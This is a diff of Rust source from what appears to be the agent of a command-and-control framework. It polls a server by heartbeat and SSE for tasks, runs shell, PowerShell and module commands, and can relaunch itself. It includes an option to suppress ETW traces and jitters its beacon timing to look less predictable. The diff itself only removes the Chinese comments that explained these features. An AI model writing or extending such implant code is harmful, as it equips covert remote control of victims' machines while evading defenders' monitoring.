@@ -40,10 +40,8 @@ pub(crate) async fn heartbeat_tick(
     session_key: Option<&[u8; 32]>,
     module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
 ) -> Result<(), String> {
-    // 心跳兜底：刷新在线状态 + 拉取可能错过的任务（SSE 为主通道）。
     let task = http.heartbeat(agent_id, session_key).await?;
     if let Some(task) = task {
-        // 并发执行：不阻塞心跳循环
         let h = http.clone();
         let mm = module_manager.clone();
         let aid = agent_id.to_string();
@@ -55,13 +53,10 @@ pub(crate) async fn heartbeat_tick(
     Ok(())
 }
 
-/// 已处理的任务 id（SSE 推送与心跳轮询双通道去重；容量上限防内存增长）。
 static SEEN_TASKS: std::sync::LazyLock<std::sync::Mutex<std::collections::HashSet<String>>> =
     std::sync::LazyLock::new(|| std::sync::Mutex::new(std::collections::HashSet::new()));
 const SEEN_TASK_CAP: usize = 512;
 
-/// 执行一个任务（SSE 推送或心跳轮询到达均可调用；按 task.id 去重）。
-/// `http` 用于结果上报（需已配置 session_token + profile）。
 pub(crate) async fn handle_task(
     http: &HttpCommunicator,
     task: &libra_common::models::AgentTask,
@@ -69,7 +64,6 @@ pub(crate) async fn handle_task(
     session_key: Option<&[u8; 32]>,
     module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
 ) {
-    // 去重：同一任务 id 只执行一次（SSE 推送 + 心跳兜底可能重复到达）
     {
         let mut seen = SEEN_TASKS.lock().unwrap();
         if seen.len() >= SEEN_TASK_CAP {
@@ -165,10 +159,6 @@ fn spawn_self() {
 }
 
 fn wrap_result(task_id: &str, output: &str) -> String {
-    // 失败判定：模块/任务层显式返回 JSON 错误对象，或显式 success:false
-    // （命令执行失败 exit≠0 时 shell 模块返回 {"success":false,...}）。
-    // 之前用 `!output.contains("\"error\"")` 会把「命令输出本身含 error 字样」
-    // 的合法结果误判为失败；只查 error 键又会把 success:false 误标为成功。
     let success = match serde_json::from_str::<serde_json::Value>(output) {
         Ok(serde_json::Value::Object(map)) => {
             !map.contains_key("error")
@@ -215,7 +205,6 @@ async fn resolve_task(
             run("shell".to_string(), input, false).await
         }
         CommandType::PowerShell => {
-            // arguments 支持 "etwSuppress=true"（ETW 痕迹抑制，默认关）
             let suppress_etw = task
                 .arguments
                 .iter()
@@ -261,9 +250,6 @@ async fn resolve_task(
             TaskOutcome::DoneUnwrapped(json)
         }
         CommandType::Generic => {
-            // 通用模块执行：command = 模块名，arguments[0] = 输入 JSON；
-            // arguments 含 "isolated=true"（服务端对敏感模块自动附加）→
-            // 在 fork 子进程中执行，模块崩溃不影响 agent 本体。
             let input = task
                 .arguments
                 .first()
@@ -319,6 +305,5 @@ async fn resolve_task(
 }
 
 pub(crate) fn jittered_interval(base_ms: u64, jitter_percent: f64) -> u64 {
-    // 块状抖动（x86 风格）：常规 ±jitter + 偶发长眠，避免均匀分布的可预测性
     crate::config::x86_style_jitter(base_ms, jitter_percent)
 }
